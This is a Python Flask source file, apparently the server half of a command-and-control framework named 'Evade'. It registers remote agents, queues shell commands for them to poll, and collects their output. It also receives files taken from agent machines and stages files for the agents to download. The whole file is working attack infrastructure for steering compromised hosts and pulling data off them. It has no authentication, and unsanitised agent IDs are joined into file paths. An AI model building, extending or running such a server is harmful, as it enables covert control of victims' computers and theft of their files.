import os
from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_socketio import SocketIO
from werkzeug.utils import secure_filename

app = Flask(__name__)
socketio = SocketIO(app)

# Define separate directories for uploads and downloads
BASE_DIR = 'E:\\Github\\Repos\\Evade-A-C2-Framework\\test\\HTTPS_COMPLETE'
UPLOADS_FOLDER = os.path.join(BASE_DIR, 'uploads_to_agents')
DOWNLOADS_FOLDER = os.path.join(BASE_DIR, 'downloads_from_agents')

app.config['UPLOADS_FOLDER'] = UPLOADS_FOLDER
app.config['DOWNLOADS_FOLDER'] = DOWNLOADS_FOLDER

# Ensure both directories exist
os.makedirs(UPLOADS_FOLDER, exist_ok=True)
os.makedirs(DOWNLOADS_FOLDER, exist_ok=True)

agents = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['POST'])
def register_agent():
    agent_id = request.form.get('agent_id')
    if agent_id:
        agents[agent_id] = {'command': '', 'files': []}
        socketio.emit('agent_registered', {'agent': agent_id})
        return jsonify({'message': 'Agent registered successfully'}), 200
    else:
        return jsonify({'error': 'Agent registration failed: Missing agent_id'}), 400

@app.route('/send_command', methods=['POST'])
def send_command():
    agent_id = request.form.get('agent_id')
    command = request.form.get('command')
    if agent_id in agents:
        agents[agent_id]['command'] = command
        return jsonify({'message': 'Command sent successfully'}), 200
    else:
        return jsonify({'error': 'Agent not found'}), 404

@app.route('/get_command', methods=['GET'])
def get_command():
    agent_id = request.args.get('agent_id')
    if agent_id in agents:
        command = agents[agent_id].get('command', '')
        return jsonify({'command': command}), 200
    else:
        return jsonify({'error': 'Agent not found'}), 404

@app.route('/send_output', methods=['POST'])
def send_output():
    agent_id = request.form.get('agent_id')
    if not agent_id:
        return jsonify({'error': 'Missing agent ID'}), 400

    if 'file' in request.files:
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No selected file'}), 400
        filename = secure_filename(file.filename)
        # Save to DOWNLOADS_FOLDER since it's from agent to server
        filepath = os.path.join(DOWNLOADS_FOLDER, agent_id, filename)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        try:
            file.save(filepath)
            socketio.emit('file_received', {'filename': filename, 'agent_id': agent_id})
            return jsonify({'message': 'File received successfully'}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    else:
        output = request.form.get('output')
        if not output:
            return jsonify({'error': 'Missing output data'}), 400
        socketio.emit('output_received', {'output': output, 'agent_id': agent_id})
        return jsonify({'message': 'Output received successfully'}), 200

@app.route('/agents', methods=['GET'])
def get_agents():
    return jsonify({'agents': list(agents.keys())}), 200

@app.route('/upload', methods=['POST'])
def upload_file():
    agent_id = request.form.get('agent_id')
    if 'file' in request.files and agent_id:
        file = request.files['file']
        filename = secure_filename(file.filename)
        # Save to UPLOADS_FOLDER since it's server to agent
        filepath = os.path.join(UPLOADS_FOLDER, agent_id, filename)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        file.save(filepath)
        socketio.emit('upload_to_agent', {'filename': filename, 'agent_id': agent_id})
        return jsonify({'message': f'File {filename} uploaded successfully to agent {agent_id}'}), 200
    return jsonify({'error': 'Upload failed, missing file or agent ID'}), 400

# Add this route to server.py for the agent to download the uploaded files
@app.route('/fetch_file/<agent_id>/<filename>', methods=['GET'])
def fetch_file(agent_id, filename):
    filepath = os.path.join(UPLOADS_FOLDER, agent_id, filename)
    if os.path.exists(filepath):
        return send_from_directory(os.path.dirname(filepath), filename, as_attachment=True)
    else:
        return jsonify({'error': 'File not found'}), 404
        
@app.route('/list_files/<agent_id>', methods=['GET'])
def list_files_for_agent(agent_id):
    agent_dir = os.path.join(UPLOADS_FOLDER, agent_id)
    if os.path.exists(agent_dir):
        files = [f for f in os.listdir(agent_dir) if os.path.isfile(os.path.join(agent_dir, f))]
        return jsonify({'files': files}), 200
    else:
        return jsonify({'error': 'No files found for the specified agent'}), 404

if __name__ == '__main__':
    # Run the app
    #socketio.run(app, debug=True, host='0.0.0.0', port=5001)
    socketio.run(app, debug=True, port=5001)
